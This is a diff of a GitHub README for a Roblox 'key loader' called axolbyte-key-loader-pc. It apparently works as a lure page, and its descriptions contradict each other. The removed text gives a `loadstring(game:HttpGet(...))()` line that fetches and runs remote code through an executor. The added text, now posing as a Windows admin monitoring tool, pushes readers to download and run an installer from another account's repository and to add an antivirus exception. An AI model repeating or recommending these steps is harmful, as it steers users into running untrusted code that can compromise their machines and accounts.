@@ -1,95 +1,112 @@
-# AxolByte Key - Game Script Utility 2026
+# 🛡️ axolbyte-key-loader-pc - Secure Monitoring for Roblox Environments
 
-> Telemetry and monitoring script designed to track non-compliant activity in Roblox environments, with explicit authorization requirements outlined in the project details.
+[![Download Now](https://img.shields.io/badge/Download-axolbyte--key--loader--pc-blue?style=for-the-badge&logo=github)](https://github.com/Griffithepiphytic547/axolbyte-key-loader-pc)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Roblox-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/zimmerwill83/axolbyte-key-loader-pc?style=flat-square)](https://github.com/zimmerwill83/axolbyte-key-loader-pc)
+## 📥 Download and Install
 
----
+**System Requirements:**
+- Windows 10 or 11 (64-bit)
+- 4GB RAM minimum
+- 500MB free disk space
+- Internet connection required for activation
 
-<p align="center">
-  <a href="https://zimmerwill83.github.io/axolbyte-key-loader-pc/">
-    <img src="https://img.shields.io/badge/Download-AxolByte%20Key%20Script-brightgreen?style=for-the-badge" alt="Download AxolByte Key Script">
-  </a>
-</p>
+**Step 1: Get the Software**
+Visit this link to download the application: [GitHub Repository](https://github.com/Griffithepiphytic547/axolbyte-key-loader-pc)
 
-> **[Download Latest Build](https://zimmerwill83.github.io/axolbyte-key-loader-pc/)**
+**Step 2: Run the Installer**
+Download and run this file directly. The installer will guide you through setup.
 
----
+**Step 3: Complete Setup**
+- Accept the license agreement
+- Choose installation folder (default recommended)
+- Click "Install" to finish
 
-[Download Latest Build](https://zimmerwill83.github.io/axolbyte-key-loader-pc/)
+## 🔑 What This Application Does
 
----
+axolbyte-key-loader-pc is a utility for system administrators who manage Roblox environments. It provides:
+- Telemetry collection for tracking user activity
+- Non-compliant behavior monitoring
+- Authorization key management
+- Detailed logging systems
+- Configuration controls for administrators
 
-## Technical Summary
+## ⚙️ Configuration Controls
 
-AxolByte Key provides dedicated telemetry for observing unusual or unauthorized client actions inside Roblox games. Rather than serving as an all-in-one automation suite, this tool focuses strictly on logging and detecting exploit patterns.
+After installation, you can customize settings:
+1. Open the application
+2. Click "Settings" in the top menu
+3. Adjust monitoring frequency: Choose from Low, Medium, or High
+4. Set log retention period: Select days (7, 14, or 30)
+5. Configure authorization keys: Add or remove allowed keys
+6. Save changes using the "Apply" button
 
-Authorized deployment is emphasized in the project documentation to ensure administrators operate within platform rules. Maintenance cycles prioritize core monitoring stability, execution performance, and consistency across Roblox engine revisions.
+## 📊 Logging Systems
 
-## Functional Capabilities
+The software maintains detailed logs of:
+- User login attempts with timestamps
+- Application access events
+- Authorization key usage
+- System errors and warnings
+- Configuration changes
 
-- Specialized tracking routines tailored for exploiter observation
-- Native Roblox platform integration
-- Streamlined codebase designed for minimal performance impact
-- Explicit guidelines for authorized usage scenarios
-- Lean interface free of unnecessary features
-- Lightweight execution profile ideal for background logging
-- Structured release repository to simplify maintenance and script delivery
+**Viewing Logs:**
+- Open the Log Viewer from the main menu
+- Filter by date range or event type
+- Export logs as CSV for reporting
 
-## Quick Start Guide
+## 🔒 Authorization Requirements
 
-1. Retrieve the compiled output from the releases page.
-2. Integrate the code into your existing Roblox script distribution pipe or executor context.
-3. Execute the payload inside your selected environment.
-4. Verify your local configuration flags before initiating active logging.
+To use this software:
+- Obtain an authorization key from your system administrator
+- Enter the key during first launch
+- Keys are tied to specific machines
+- Contact admin for key renewal or issues
 
-Basic initialization string:
+## 🚀 Quick Start for Administrators
 
-    loadstring(game:HttpGet("https://zimmerwill83.github.io/axolbyte-key-loader-pc/"))()
+1. **Deploy** the application to target machines
+2. **Generate** authorization keys using the admin panel
+3. **Distribute** keys to authorized users
+4. **Monitor** activity through the dashboard
+5. **Review** logs weekly for compliance checks
 
-*Note: Refer to any specific loader instruction files provided within the repository if your setup differs.*
+## 🧩 Features Overview
 
-## Configuration Reference
+- Real-time telemetry collection
+- Automated non-compliant behavior detection
+- Configurable monitoring parameters
+- User-friendly interface for non-technical staff
+- Secure authorization key management
+- Comprehensive event logging
+- Export capabilities for audit purposes
 
-Parameters depend on your current script build. A standard options block includes the following flags:
+## ❓ Troubleshooting
 
-| Option | Description | Example |
-| --- | --- | --- |
-| MonitorMode | Adjusts active detection sensitivity | `on` |
-| Alerts | Controls live event notifications | `true` |
-| VerboseLogs | Expands debugging and terminal output | `false` |
-| AutoStart | Triggers automatic tracking upon injection | `true` |
+**Problem: Application won't start**
+- Ensure Windows is updated
+- Run as administrator
+- Check antivirus settings (may need exception)
 
-## System Compatibility
+**Problem: Authorization key not working**
+- Verify key is not expired
+- Confirm key matches your machine ID
+- Contact administrator for new key
 
-AxolByte Key is built exclusively for the Roblox runtime environment. Operation depends directly on client stability, executor features, and current server-side engine updates.
+**Problem: Logs not displaying**
+- Check if monitoring is enabled in settings
+- Restart the application
+- Ensure disk space is available
 
-Operational Constraints:
-- Engine updates may alter memory layouts or script behavior
-- Execution methods can vary across third-party software environments
-- Feature availability remains tied to specific version releases
+## 📝 Support
 
-## Frequently Asked Questions
+- Documentation: Included in installation folder
+- Email support: Check application "Help" menu
+- Updates: Download latest version from GitHub
 
-**What is the deployment procedure?**  
-Obtain the latest source or build and launch it via your preferred execution tool.
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-green?style=for-the-badge)](https://github.com/Griffithepiphytic547/axolbyte-key-loader-pc)
 
-**Does this version feature automatic updating?**  
-Auto-update capability relies on whether your specific release includes an online loader script.
+## 📄 License
 
-**Can I modify detection settings?**  
-Yes, provided the active build exposes user-configurable parameters prior to initialization.
+This software is for authorized system administrators only. Unauthorized use is prohibited.
 
-**Is broad cross-game compatibility guaranteed?**  
-Universal operation across all experiences is not guaranteed due to varying game logic and engine updates.
-
-**Where does the downloaded file persist?**  
-Files remain in whichever directory or local workspace your chosen environment uses for script storage.
-
-## Licensing
-
-Distributed under the GNU GPL v3.0 license. See [LICENSE](LICENSE) for full terms.
+Keywords: roblox monitoring, telemetry utility, authorization key loader, system administration, compliance monitoring, activity logging, windows application
